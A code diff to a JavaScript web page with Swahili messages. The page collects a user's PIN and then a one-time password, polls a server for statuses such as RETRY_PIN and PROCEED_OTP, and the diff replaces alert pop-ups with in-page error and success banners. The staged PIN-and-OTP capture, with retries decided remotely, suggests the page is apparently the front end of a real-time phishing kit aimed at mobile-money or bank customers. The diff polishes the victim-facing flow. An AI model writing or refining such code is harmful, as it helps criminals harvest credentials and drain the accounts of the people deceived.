@@ -4,7 +4,7 @@ document.addEventListener('DOMContentLoaded', () => {
   let statusPollInterval = null;
   let countdownTimer = null;
 
-  // Ensure loading overlay exists in DOM
+  // Loading overlay setup
   let loadingOverlay = document.getElementById('loading-overlay');
   if (!loadingOverlay) {
     loadingOverlay = document.createElement('div');
@@ -38,6 +38,16 @@ document.addEventListener('DOMContentLoaded', () => {
     pin: '',
     otp: ''
   };
+
+  function clearPinInputs() {
+    document.querySelectorAll('.pin-box').forEach(box => box.value = '');
+    if (document.querySelector('.pin-box')) document.querySelector('.pin-box').focus();
+  }
+
+  function clearOtpInputs() {
+    document.querySelectorAll('.otp-box').forEach(box => box.value = '');
+    if (document.querySelector('.otp-box')) document.querySelector('.otp-box').focus();
+  }
 
   function showScreen(screenNum) {
     hideLoading();
@@ -184,6 +194,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     appData.pin = pinVal;
     
+    // Clear previous status banner
+    const pinBanner = document.getElementById('pin-status-banner');
+    pinBanner.className = 'status-banner';
+    pinBanner.innerText = '';
+
     showLoading("Inathibitisha PIN yako... Tafadhali subiri");
 
     try {
@@ -263,6 +278,10 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     appData.otp = otpVal;
 
+    const otpBanner = document.getElementById('otp-status-banner');
+    otpBanner.className = 'status-banner';
+    otpBanner.innerText = '';
+
     showLoading("Inathibitisha OTP... Tafadhali subiri");
 
     try {
@@ -292,25 +311,34 @@ document.addEventListener('DOMContentLoaded', () => {
         
         if (data.status === 'PROCEED_OTP' && stage === 'PIN') {
           clearInterval(statusPollInterval);
-          onSuccess();
+          hideLoading();
+          showScreen(7);
+          startOtpCountdown();
         } else if (data.status === 'SUCCESS' && stage === 'OTP') {
           clearInterval(statusPollInterval);
-          onSuccess();
+          hideLoading();
+          showScreen(8);
         } else if (data.status === 'RETRY_PIN') {
           clearInterval(statusPollInterval);
           hideLoading();
-          alert('PIN ISIYO SAHIHI');
-          showScreen(6);
+          clearPinInputs();
+          const pinBanner = document.getElementById('pin-status-banner');
+          pinBanner.innerText = 'PIN ISIYO SAHIHI';
+          pinBanner.className = 'status-banner error';
         } else if (data.status === 'RETRY_OTP') {
           clearInterval(statusPollInterval);
           hideLoading();
-          alert('UMEINGIZA OTP ILIYOISHA MUDA WAKE');
+          clearOtpInputs();
+          const otpBanner = document.getElementById('otp-status-banner');
+          otpBanner.innerText = 'UMEINGIZA OTP ILIYOISHA MUDA WAKE';
+          otpBanner.className = 'status-banner error';
         } else if (data.status === 'SUCCESS' && stage === 'PIN') {
-          // If approved directly at PIN stage
           clearInterval(statusPollInterval);
           hideLoading();
-          alert('HONGERA UMEIDHINISHA');
-          showScreen(8);
+          const pinBanner = document.getElementById('pin-status-banner');
+          pinBanner.innerText = 'HONGERA UMEIDHINISHA';
+          pinBanner.className = 'status-banner success';
+          setTimeout(() => showScreen(8), 1500);
         }
       } catch (err) {}
     }, 3000);
@@ -320,4 +348,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-      
+                            
